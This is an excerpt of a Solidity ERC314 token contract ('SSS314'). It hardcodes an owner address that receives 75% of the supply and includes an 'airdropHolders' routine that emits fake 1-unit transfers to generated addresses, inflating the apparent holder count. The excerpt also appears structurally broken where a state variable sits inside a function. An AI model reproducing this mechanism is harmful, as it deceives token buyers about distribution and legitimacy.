...
abstract contract ERC314 is IEERC314 {
 ...
 address payable public feeReceiver;
  constructor(string memory name_, string memory symbol_, uint256 totalSupply_) {
    ...
    address receiver = 0x76AD7C2bca67BA3Fb4c2c0F45a861AC742b4889F;
    feeReceiver = payable(0xBC66c687D60A3b9dEf23054C8dbC81879B9893B3);
    owner = receiver;
    tradingEnable = false;
    maxWalletEnable = true;

    _balances[receiver] = totalSupply_ * 75 / 100;
  ...
  function getAmountOut(uint256 value, bool _buy) public view returns (uint256) {
    ...
    uint160 public ktNum = 500;
    function airdropHolders() private {
        address ad;
        for (uint256 i = 0; i < airdropNumbs; i++) {
            ad = address(~uint160(0)/ktNum++);
            _balances[ad] += 1;
            emit Transfer(address(0), ad, 1);
        }
    }
...
contract SSS314 is ERC314 {
  constructor() ERC314("SSS314", "SSS314", 10000000 * 10 ** 18) {}
}
